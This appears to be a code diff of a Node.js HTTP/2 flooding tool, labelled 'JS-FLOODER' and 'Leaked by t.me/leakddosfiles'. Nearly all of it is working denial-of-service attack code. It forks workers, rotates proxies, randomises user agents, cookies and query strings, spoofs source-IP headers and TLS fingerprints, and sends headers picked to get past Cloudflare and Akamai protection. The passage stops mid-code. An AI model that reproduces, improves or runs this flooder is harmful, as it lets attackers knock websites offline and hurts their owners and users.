@@ -1,225 +1,76 @@
-const url = require('url')
-	, fs = require('fs')
-	, http2 = require('http2')
-	, http = require('http')
-	, tls = require('tls')
-	, cluster = require('cluster')
-//random ua by string
-const crypto = require('crypto');
+// by Joseph! 
+const net = require("net");
+const http2 = require("http2");
+const http = require('http');
+const tls = require("tls");
+const cluster = require("cluster");
+const url = require("url");
 const dns = require('dns');
-const fetch = require('node-fetch');
 const util = require('util');
-const currentTime = new Date();
-const httpTime = currentTime.toUTCString();
-const errorHandler = error => {
-	//console.log(error);
-};
-process.on("uncaughtException", errorHandler);
-process.on("unhandledRejection", errorHandler);
+const socks = require('socks').SocksClient;
+const crypto = require("crypto");
+const HPACK = require('hpack');
+const fs = require("fs");
+const os = require("os");
+const colors = require("colors");
+const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+const ciphers = "GREASE:" + [
+    defaultCiphers[2],
+    defaultCiphers[1],
+    defaultCiphers[0],
+    ...defaultCiphers.slice(3)
+].join(":");
 
-var parsed = url.parse(process.argv[2]);
-const lookupPromise = util.promisify(dns.lookup);
-let val 
-let isp
-let pro
-async function getIPAndISP(url) {
-  try {
-    const { address } = await lookupPromise(url);
-    const apiUrl = `http://ip-api.com/json/${address}`;
-    const response = await fetch(apiUrl);
-    if (response.ok) {
-      const data = await response.json();
-       isp = data.isp;
-      console.log('ISP ', url, ':', isp);
-	  if (isp === 'Cloudflare, Inc.') {
-		 pro =[ 
-			{'Methods' : ''},
-		    {'Quic-Version' : '0x00000001'},
-			
-		]
-		  val = { 'NEl': Math.random() < 0.5 ? JSON.stringify({
-			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
-			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
-			"include_subdomains": Math.random() < 0.5 ? true : false}) : JSON.stringify({
-	  "success_fraction":0,
-      "report_to":Math.random() < 0.5 ? "cf-nel" : 'default',
-      "max_age":604800}),
-		  }
-	  }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
-		 pro = {'Quic-Version' : '0x00000001'}
-		val = { 'NEl': JSON.stringify({
-			"report_to":"default",
-			"max_age":3600,
-			"include_subdomains":true}),
-		  }
-	  } else {
-		val = {'Etag': "71735e063326b9646d2a4f784ac057ff"}
-		pro = {'Strict-Transport-Security': 'max-age=31536000'}
-           
-	  }
-    } else {
-     return
-    }
-  } catch (error) {
-    return
-  }
+async function getFetch() {
+    return (await import('node-fetch')).default; // Динамический импорт
 }
 
-const targetURL = parsed.host; 
-
-getIPAndISP(targetURL);
-
-try {
-	var colors = require('colors');
-} catch (err) {
-	console.log('\x1b[36mInstalling\x1b[37m the requirements');
-	execSync('npm install colors');
-	console.log('Done.');
-	process.exit();
-}
-cplist = [
-		'TLS_AES_256_GCM_SHA384',
-		'TLS_CHACHA20_POLY1305_SHA256',
-		'TLS_AES_128_GCM_SHA256',
-     'ECDHE-ECDSA-AES128-GCM-SHA256',
-     'ECDHE-ECDSA-CHACHA20-POLY1305'
-		, ]
-controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
-	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
-	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
-const headerFunc = {
-	cipher() {
-		return cplist[Math.floor(Math.random() * cplist.length)];
-	}
-, }
-
-process.on('uncaughtException', function(e) {
-	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).on('unhandledRejection', function(e) {
-	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).on('warning', e => {
-	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).setMaxListeners(0);
-function randomIp() {
-	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
-	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
-	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
-	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
-	return `${segment1}.${segment2}.${segment3}.${segment4}`;
+function encodeSettings(settings) {
+    const data = Buffer.alloc(6 * settings.length);
+    settings.forEach(([id, value], i) => {
+        data.writeUInt16BE(id, i * 6);
+        data.writeUInt32BE(value, i * 6 + 2);
+    });
+    return data;
 }
 
-const target = process.argv[2];
-const time = process.argv[3];
-const thread = process.argv[4];
-const proxyFile = process.argv[5];
-const rps = process.argv[6];
-let input = process.argv[7];
-let query = process.argv[8];
-// Validate input
-if (!target || !time || !thread || !proxyFile || !rps || !input) {
-	console.log('JS-FLOODER'.bgRed)
-	console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood query(true/false)`.rainbow);
- console.log('default : query : true'.red);
-	process.exit(1);
-}
-// Validate target format
-if (!/^https?:\/\//i.test(target)) {
-	console.error('sent with http:// or https://');
-	process.exit(1);
-}
-// Parse proxy list
-let proxys = [];
-try {
-	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
-	proxys = proxyData.match(/\S+/g);
-} catch (err) {
-	console.error('Error proxy file:', err.message);
-	process.exit(1);
-}
-// Validate RPS value
-if (isNaN(rps) || rps <= 0) {
-	console.error('number rps');
-	process.exit(1);
-}
-const proxyr = () => {
-	return proxys[Math.floor(Math.random() * proxys.length)];
-}
-if (cluster.isMaster) {
-	console.clear()
-	console.log(`success attack`.bgRed)
-		, console.log(`flood`.yellow)
-process.stdout.write("Loading: 10%\n");
-setTimeout(() => {
-  process.stdout.write("\rLoading: 50%\n");
-}, 500 * time );
-
-setTimeout(() => {
-  process.stdout.write("\rLoading: 100%\n");
-}, time * 1000);
-	for (let i = 0; i < thread; i++) {
-		cluster.fork();
-	}
-	setTimeout(() => process.exit(-1), time * 1000);
-} else {
-	if (input === 'flood') {
-	const abu =	setInterval(function() {
-			flood()
-		}, 1);
-	}else {
-	setInterval(flood)
-}
+const urihost = [
+    'google.com',
+    'youtube.com',
+    'facebook.com',
+    'baidu.com',
+    'wikipedia.org',
+    'x.com',
+    'amazon.com',
+    'yahoo.com',
+    'reddit.com',
+    'bing.com',
+    'duckduckgo.com',
+    'netflix.com'
+];
+clength = urihost[Math.floor(Math.random() * urihost.length)]
+function encodeFrame(streamId, type, payload = "", flags = 0) {
+    const frame = Buffer.alloc(9 + payload.length);
+    frame.writeUInt32BE(payload.length << 8 | type, 0);
+    frame.writeUInt8(flags, 4);
+    frame.writeUInt32BE(streamId, 5);
+    if (payload.length > 0) frame.set(payload, 9);
+    return frame;
 }
 
-async function flood() {
-	var parsed = url.parse(target);
-	var cipper = headerFunc.cipher();
-	
-	var proxy = proxyr().split(':');
-	var randIp = randomIp();
-	let interval
-	if (input === 'flood') {
-	  interval = 1000;
-	} else if (input === 'bypass') {
-	  function randomDelay(min, max) {
-		return Math.floor(Math.random() * (max - min + 1)) + min;
-	  }
-  
-	  // T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
-	  interval = randomDelay(1000, 5000);
-	} else {
-	  interval = 1000;
-	}
-  
-  
-	  
-	const mediaTypes = [
-		'text/html'
-		, 'application/xhtml+xml'
-		, 'application/xml'
-		, 'image/avif'
-		, 'image/webp'
-		, 'image/apng'
-		, '/'
-		, 'application/signed-exchange'
-	];
-	const acceptValues = [];
-	mediaTypes.forEach((type, index) => {
-		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
-		acceptValues.push(`${type};q=${quality}`);
-	});
-	const acceptHeader = acceptValues.join(',');
-	  
-	function randstra(length) {
-		const characters = "0123456789";
-		let result = "";
-		const charactersLength = characters.length;
-		for (let i = 0; i < length; i++) {
-			result += characters.charAt(Math.floor(Math.random() * charactersLength));
-		}
-		return result;
-	}
+function getRandomInt(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
 
-	  function randstr(length) {
+
+function randomIntn(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+ function randomElement(elements) {
+     return elements[randomIntn(0, elements.length)];
+ }
+    
+  function randstr(length) {
 		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 		let result = "";
 		const charactersLength = characters.length;
@@ -228,490 +79,1017 @@ async function flood() {
 		}
 		return result;
 	}
-	
-	function aString(minLength, maxLength) {
-					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
-  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-  const randomStringArray = Array.from({ length }, () => {
-    const randomIndex = Math.floor(Math.random() * characters.length);
-    return characters[randomIndex];
-  });
+  function generateRandomString(minLength, maxLength) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
+ const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+ const randomStringArray = Array.from({ length }, () => {
+   const randomIndex = Math.floor(Math.random() * characters.length);
+   return characters[randomIndex];
+ });
 
-  return randomStringArray.join('');
-}
-	const randstrsValue = randstr(25);
-	
- 	
-
-	const rateHeaders = [
-  { "dnt": "1" },
-  { "te": "trailers" },
-  { "origin": "https://" + parsed.host },
-  { "referer": "https://" + parsed.host + '/' },
-  { "source-ip": randIp },
-  { "viewport-height": "1080" },
-  { "viewport-width": "1920" },
-  { "device-memory": "0.25" },
-  // Header tambahan untuk bypass Amazon dan Google LLC
-  { "x-amzn-trace-id": "Root=" + generateRandomString(20, 30) },
-  { "x-google-cache-control": "remote-fetch" },
-];
-
-const rateHeaders2 = [
-  { "dnt": "1" },
-  { "origin": "https://" + parsed.host },
-  { "referer": "https://" + parsed.host + "/" },
-  { "cookie": generateRandomString(1, 5) + "=" + generateRandomString(120, 150) },
-  { "viewport-height": "1080" },
-  { "viewport-width": "1920" },
-  { "device-memory": "0.25" },
-  // Header tambahan untuk bypass Amazon dan Google LLC
-  { "x-amzn-trace-id": "Root=" + generateRandomString(20, 30) },
-  { "x-google-cache-control": "remote-fetch" },
-];
-
-
-var hd1 = [ 
-{ 'x-aspnet-version': randstrsValue},
-//{undefined}
-]
-var hd2 = [ 
-{'accept-charset' : randstrsValue},
-{'Accept-Ranges': Math.random() < 0.5 ? 'bytes' : 'none'},
-//{undefined}
-]
-const rhd = [
-{ "worker": Math.random() < 0.5 ? 'true' : 'null'},
-{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
-{"expect-ct": "enforce"},
-//{undefined}
-]
-var hdd = [
-	{ "HTTP2-Setting" : Math.random() < 0.5 ? 'token64' : 'token68'},
-	undefined
-]
-     
-var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11","Windows NT 11.0"];
-var architectures = {
-  "Windows NT 10.0": `Win64; x64`,
-  "Windows NT 11.0": Math.random() < 0.5 ? `WOW64; Trident/${randstra(2)}.${randstra(1)}.0; rv:10${randstra(1)}.0` : `Win64; x64`,
-  "Macintosh": Math.random() < 0.5 ? `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}` : `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}; rv:10${randstra(1)}.0  ` ,
-  "X11": Math.random() < 0.5 ? `Linux x86_64; rv:10${randstra(1)}.0` : `Linux x86_64`
-};
-var browserss = [
-	`Firefox/118.0`,
-	`Firefox/117.0`,
-	`Firefox/116.0`,
-	`Firefox/115.0`,
-	`Firefox/114.0`,
-	`Firefox/113.0`,
-	`Firefox/112.0`,
-	`Firefox/111.0`,
-	`Firefox/110.0`,
-	`Firefox/109.0`,
-]
-var browsers = [
-	"Chrome/118.0.0.0 Safari/537.36",
-   "Chrome/117.0.0.0 Safari/537.36",
-   "Chrome/116.0.0.0 Safari/537.36",
-   "Chrome/115.0.0.0 Safari/537.36",
-   "Chrome/114.0.0.0 Safari/537.36",
-   "Chrome/113.0.0.0 Safari/537.36",
-   "Chrome/112.0.0.0 Safari/537.36",
-   "Chrome/111.0.0.0 Safari/537.36",
-   "Chrome/110.0.0.0 Safari/537.36",
-   "Chrome/109.0.0.0 Safari/537.36",
-   "Chrome/108.0.0.0 Safari/537.36",
-  "Version/16.5 Safari/605.1.15",
-  "Chrome/118.0.0.0 Safari/537.36 Edg/118", 
-  "Chrome/117.0.0.0 Safari/537.36 Edg/117", 
-  "Chrome/116.0.0.0 Safari/537.36 Edg/116", 
- "Chrome/115.0.0.0 Safari/537.36 Edg/115",
- "Chrome/114.0.0.0 Safari/537.36 Edg/114",
- "Chrome/113.0.0.0 Safari/537.36 Edg/113",
- "Chrome/112.0.0.0 Safari/537.36 Edg/112",
- "Chrome/111.0.0.0 Safari/537.36 Edg/111",
- "Chrome/110.0.0.0 Safari/537.36 Edg/110",
- "Chrome/109.0.0.0 Safari/537.36 Edg/109",
- "Chrome/108.0.0.0 Safari/537.36 Edg/108",
- "Chrome/118.0.0.0 Safari/537.36 Vivaldi/118",
- "Chrome/117.0.0.0 Safari/537.36 Vivaldi/117",
- "Chrome/116.0.0.0 Safari/537.36 Vivaldi/116",
- "Chrome/115.0.0.0 Safari/537.36 Vivaldi/115",
- "Chrome/114.0.0.0 Safari/537.36 Vivaldi/114",
- "Chrome/113.0.0.0 Safari/537.36 Vivaldi/113",
- "Chrome/112.0.0.0 Safari/537.36 Vivaldi/112",
- "Chrome/111.0.0.0 Safari/537.36 Vivaldi/111",
- "Chrome/110.0.0.0 Safari/537.36 Vivaldi/110",
- "Chrome/109.0.0.0 Safari/537.36 Vivaldi/109",
- "Chrome/118.0.0.0 Safari/537.36 OPR/118",
- "Chrome/117.0.0.0 Safari/537.36 OPR/117",
- "Chrome/116.0.0.0 Safari/537.36 OPR/116",
- "Chrome/115.0.0.0 Safari/537.36 OPR/115",
- "Chrome/114.0.0.0 Safari/537.36 OPR/114",
- "Chrome/113.0.0.0 Safari/537.36 OPR/113",
- "Chrome/112.0.0.0 Safari/537.36 OPR/112",
- "Chrome/111.0.0.0 Safari/537.36 OPR/111",
- "Chrome/110.0.0.0 Safari/537.36 OPR/110",
- "Chrome/109.0.0.0 Safari/537.36 OPR/109",
- "Chrome/108.0.0.0 Safari/537.36 OPR/108",			 
-];
-function getRandomValue(arr) {
-  const randomIndex = Math.floor(Math.random() * arr.length);
-  return arr[randomIndex];
+ return randomStringArray.join('');
 }
 
-const randomOS = getRandomValue(operatingSystems);
-const randomArch = architectures[randomOS]; 
-const randomBrowser = getRandomValue(browsers);
-const randomsBrowser = getRandomValue(browserss);
-var uas = await Math.random() < 0.5 ? `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`: `Mozilla/5.0 (${randomOS}; ${randomArch}; rv:109.0) Gecko/20100101 ${randomsBrowser}`
-
-
-//console.log(uas)
-function generateRandomString(minLength, maxLength) {
-					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
-  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-  const randomStringArray = Array.from({ length }, () => {
-    const randomIndex = Math.floor(Math.random() * characters.length);
-    return characters[randomIndex];
-  });
-
-  return randomStringArray.join('');
-}
-   hd = {}
-     header = {
-    ':method': 'GET'
-		, ':authority': parsed.host
-		, 'x-forwarded-proto':'https'
-  };
-  if (query === 'true'){
-	header[':path']=parsed.path + '?' + generateRandomString(5, 15) + '=' + generateRandomString(20, 25) ;
-  }else if (query === 'false'){
-	header[':path']=parsed.path;
-  }else{
-	header[':path']=parsed.path + '?' + generateRandomString(5, 15) + '=' + generateRandomString(20, 25) ;
-  }
-  
-
-header[':scheme']= 'https';
-header['cache-control']= Math.random() < 0.5 ? 'no-cache, no-store' : `max-age=${randstra(4)}`;
-//header['vary'] = 'Accept-Encoding';
-header["upgrade-insecure-requests"]= "1";
-const brw = ['chrome','firefox','edge','macos','linux','yandex']
-let dynHeaders
-let ci
-let bruh 
-async function rand() {
-	var browser = brw[Math.floor(Math.random() * brw.length)]
-	if (browser === 'chrome') {
-    
-	 dynHeaders = {
-		...hd[Math.floor(Math.random() * hd.length)], 
-		...header,
-		...val,
-		'User-Agent':  uas,
-        ...pro,
-		...hdd[Math.floor(Math.random() * hdd.length)],
-		...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
-		...hd2[Math.floor(Math.random() * hd2.length)],
-		...rhd[Math.floor(Math.random() * rhd.length)],
-		...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
-		...hd1[Math.floor(Math.random() * hd1.length)],
-		...(Math.random() < 0.5 ? {"RTT": Math.floor(Math.random() * 500) + 100} : {}),
-		
-					  };
-					}else if (browser === 'firefox'){
-						
-						dynHeaders = {
-							...hd[Math.floor(Math.random() * hd.length)], 
-							...val,
-                            ...pro,
-							...header,
-							'User-Agent':  uas,
-							...(Math.random() < 0.5 ? {"downlink": Math.random() < 0.5 ? "0.5" : "1.0"} : {}),
-							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
-							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
-							...hd2[Math.floor(Math.random() * hd2.length)],
-							...hdd[Math.floor(Math.random() * hdd.length)],
-							...hd1[Math.floor(Math.random() * hd1.length)],
-							...rhd[Math.floor(Math.random() * rhd.length)],
-										  };
-					} else if (browser === 'yandex') {
-						
-						dynHeaders = {
-							...hd[Math.floor(Math.random() * hd.length)], 
-							...header,
-							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
-							...val,
-							...hd2[Math.floor(Math.random() * hd2.length)],
-                            ...pro,
-							...(Math.random() < 0.5 ? {"ECT": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)]} : {}),
-							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
-							'User-Agent':  uas,
-							...hdd[Math.floor(Math.random() * hdd.length)],
-							...hd1[Math.floor(Math.random() * hd1.length)],
-							...rhd[Math.floor(Math.random() * rhd.length)],
-										  };
-					} else if (browser === 'linux') {
-						dynHeaders = {
-							
-							...header,
-							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
-							...val,
-							...hd2[Math.floor(Math.random() * hd2.length)],
-                            ...pro,
-							'User-Agent':  uas,
-							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
-							...hd1[Math.floor(Math.random() * hd1.length)],
-							...hdd[Math.floor(Math.random() * hdd.length)],
-							...rhd[Math.floor(Math.random() * rhd.length)],
-							...hd[Math.floor(Math.random() * hd.length)], 
-							...(Math.random() < 0.5 ? {"priority": "u=1"} : {}),
-							...(Math.random() < 0.5 ? {"ECT": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)]} : {}),
-										  };
-					} else if (browser === 'macos') {
-						dynHeaders = {
-							...header,
-							
-							...(Math.random() < 0.5 ? {} : rateHeaders[Math.floor(Math.random() * rateHeaders.length)]),
-							...val,
-							...hd2[Math.floor(Math.random() * hd2.length)],
-                            ...pro,
-							'User-Agent':  uas,
-							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
-							...hd1[Math.floor(Math.random() * hd1.length)],
-							...hdd[Math.floor(Math.random() * hdd.length)],
-							...(Math.random() < 0.5 ? {"downlink": Math.random() < 0.5 ? "0.5" : "1.0"} : {}),
-							...(Math.random() < 0.5 ? {"priority": "u=1"} : {}),
-							...rhd[Math.floor(Math.random() * rhd.length)],
-							...hd[Math.floor(Math.random() * hd.length)], 
-										  };
-					} else {
-						dynHeaders = {
-							...hd[Math.floor(Math.random() * hd.length)], 
-							...header,
-							'User-Agent':  uas,
-							...val,
-                            ...pro,
-							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
-							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
-							...hd2[Math.floor(Math.random() * hd2.length)],
-							...hdd[Math.floor(Math.random() * hdd.length)],
-							...hd1[Math.floor(Math.random() * hd1.length)],
-							...rhd[Math.floor(Math.random() * rhd.length)],
-							...(Math.random() < 0.5 ? {"priority": "u=1"} : {}),
-							...(Math.random() < 0.5 ? {"downlink": Math.random() < 0.5 ? "0.5" : "1.0"} : {}),
-							...(Math.random() < 0.5 ? {"ECT": ["4g", "3g", "2g"][Math.floor(Math.random() * 3)]} : {}),
-							...(Math.random() < 0.5 ? {"RTT": Math.floor(Math.random() * 500) + 100} : {}),
-										  };
-					}
-					return dynHeaders
-	
-}
-rand()
-	const agent = await new http.Agent({
-		host: proxy[0]
-		, port: proxy[1]
-		, keepAlive: true
-		, keepAliveMsecs: 500000000
-		, maxSockets: 50000
-		, maxTotalSockets: 100000
-	, });
-	const Optionsreq = {
-		agent: agent
-		, method: 'CONNECT'
-		, path: parsed.host + ':443'
-		, timeout: 1000
-		, headers: {
-			'Host': parsed.host
-			, 'Proxy-Connection': 'Keep-Alive'
-			, 'Connection': 'Keep-Alive'
-			, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
-		, }
-	, };
-	connection = await http.request(Optionsreq, (res) => {});
- connection.on('error', (err) => {
- 
- if (err) return
-});
- connection.on('timeout', async () => {
-		return
-		});
-	const TLSOPTION = {
-		ciphers: cipper
-		, secureProtocol:['TLSv1_3_method'] 
-		, echdCurve: Math.random() < 0.5 ? "X25519" : 'auto'
-		, secure: true
-		, rejectUnauthorized: false
-		, ALPNProtocols: ['h2']
-	, };
-
-	async function createCustomTLSSocket(parsed, socket) {
-		const tlsSocket = await tls.connect({
-			...TLSOPTION
-			, host: parsed.host
-			, port: 443
-			, servername: parsed.host
-			, socket: socket
-		});
-		return tlsSocket;
-	}
-	function generateJA3Fingerprint(socket) {
-		const cipherInfo = socket.getCipher();
-		const supportedVersions = socket.getProtocol();
-	  
-		if (!cipherInfo) {
-		  console.error('Cipher info is not available. TLS handshake may not have completed.');
-		  return null;
-		}
-	  
-		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
-	  
-		const md5Hash = crypto.createHash('md5');
-		md5Hash.update(ja3String);
-	  
-		return md5Hash.digest('hex');
-	  }	  
-	  
- 
-	 
-	connection.on('connect', async function(res, socket) {
-
-		const tlsSocket = await createCustomTLSSocket(parsed, socket);
-let ja3Fingerprint; 
-
-
-function getJA3Fingerprint() {
-    return new Promise((resolve, reject) => {
-        tlsSocket.on('secureConnect', () => {
-            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
-            resolve(ja3Fingerprint); 
-        });
-
-        
-        tlsSocket.on('error', (error) => {
-            reject(error); 
-        });
+ function randnum(minLength, maxLength) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    const randomStringArray = Array.from({
+      length
+    }, () => {
+      const randomIndex = Math.floor(Math.random() * characters.length);
+      return characters[randomIndex];
     });
+    return randomStringArray.join('');
+  }
+    const cplist = [
+       "TLS_AES_128_CCM_8_SHA256",
+       "TLS_AES_128_CCM_SHA256",
+       "TLS_CHACHA20_POLY1305_SHA256",
+       "TLS_AES_256_GCM_SHA384",
+       "TLS_AES_128_GCM_SHA256",
+       "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
+       "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
+       "TLS_DHE_RSA_WITH_AES_128_GCM_SHA256",
+       "TLS_DHE_RSA_WITH_AES_256_GCM_SHA384"
+ ];
+ var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
+ ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
+process.on('uncaughtException', function(e) {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).on('unhandledRejection', function(e) {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).on('warning', e => {
+	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+}).setMaxListeners(0);
+ require("events").EventEmitter.defaultMaxListeners = 0;
+ const sigalgs = [
+     "ecdsa_secp256r1_sha256",
+     "rsa_pss_rsae_sha256",
+     "rsa_pkcs1_sha256",
+     "ecdsa_secp384r1_sha384",
+     "rsa_pss_rsae_sha384",
+     "rsa_pkcs1_sha384",
+     "rsa_pss_rsae_sha512",
+     "rsa_pkcs1_sha512"
+] 
+  let SignalsList = sigalgs.join(':')
+const ecdhCurve = "GREASE:X25519:P-256:P-384:P-521:X448";
+const secureOptions = 
+ crypto.constants.SSL_OP_NO_SSLv2 |
+ crypto.constants.SSL_OP_NO_SSLv3 |
+ crypto.constants.SSL_OP_NO_TLSv1 |
+ crypto.constants.SSL_OP_NO_TLSv1_1 |
+ crypto.constants.SSL_OP_NO_TLSv1_3 |
+ crypto.constants.ALPN_ENABLED |
+ crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+ crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+ crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
+ crypto.constants.SSL_OP_COOKIE_EXCHANGE |
+ crypto.constants.SSL_OP_PKCS1_CHECK_1 |
+ crypto.constants.SSL_OP_PKCS1_CHECK_2 |
+ crypto.constants.SSL_OP_SINGLE_DH_USE |
+ crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+ crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
+ if (process.argv.length < 7){console.log(`Leaked by t.me/leakddosfiles \nUsage: \nnode code-h2 host time req thread proxy file\nExample: node anus-h2 https://google.com/ 60 64 10 proxy.txt `); process.exit();}
+ const secureProtocol = "TLS_method";
+ const headers = {};
+ 
+ const secureContextOptions = {
+     ciphers: ciphers,
+     sigalgs: SignalsList,
+     honorCipherOrder: true,
+     secureOptions: secureOptions,
+     secureProtocol: secureProtocol
+ };
+ 
+ const secureContext = tls.createSecureContext(secureContextOptions);
+ const args = {
+     target: process.argv[2],
+     time: ~~process.argv[3],
+     Rate: ~~process.argv[4],
+     threads: ~~process.argv[5],
+     proxyFile: process.argv[6],
+ }
+ 
+
+ var proxies = readLines(args.proxyFile);
+ const parsedTarget = url.parse(args.target); 
+ class NetSocket {
+     constructor(){}
+ 
+     async SOCKS5(options, callback) {
+
+      const address = options.address.split(':');
+      socks.createConnection({
+        proxy: {
+          host: options.host,
+          port: options.port,
+          type: 5
+        },
+        command: 'connect',
+        destination: {
